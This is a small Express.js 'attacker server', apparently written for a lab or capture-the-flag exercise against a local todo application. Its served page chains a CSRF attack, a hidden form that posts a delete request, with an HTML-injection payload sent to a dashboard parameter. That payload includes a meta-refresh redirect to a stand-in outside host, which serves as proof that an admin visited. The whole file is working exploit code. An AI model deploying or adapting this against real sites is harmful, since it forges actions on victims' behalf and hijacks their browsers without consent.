const express = require('express');
const app = express();
const PORT = process.env.PORT || 8080;

// CSRF + HTML Injection (admin hit)
app.get('/', (req, res) => {
  const dashboardPayload = `</div><meta http-equiv="refresh" content="0;url=http://localhost:3000/dashboard?s=${encodeURIComponent(
    `</div><meta http-equiv='refresh' content='0;url=https://your-host.example/seen'><div>`
  )}"><div>`;

  res.set('Content-Type', 'text/html');
  res.send(`<!doctype html>
<title>poke</title>
<form id="del" method="POST" action="http://localhost:3000/delete-todo">
  <input type="hidden" name="id" value="1">
</form>
<form id="dash" method="GET" action="http://localhost:3000/dashboard">
  <input type="hidden" name="s" value="${dashboardPayload}">
</form>
<input type="submit" form="del" value="go" autofocus>
<input type="submit" form="dash" value="next">
`);
});

// Proof endpoint
app.get('/seen', (req, res) => {
  console.log('✅ admin hit /seen');
  res.send('ok');
});

app.listen(PORT, () => console.log(`Attacker server running on port ${PORT}`));
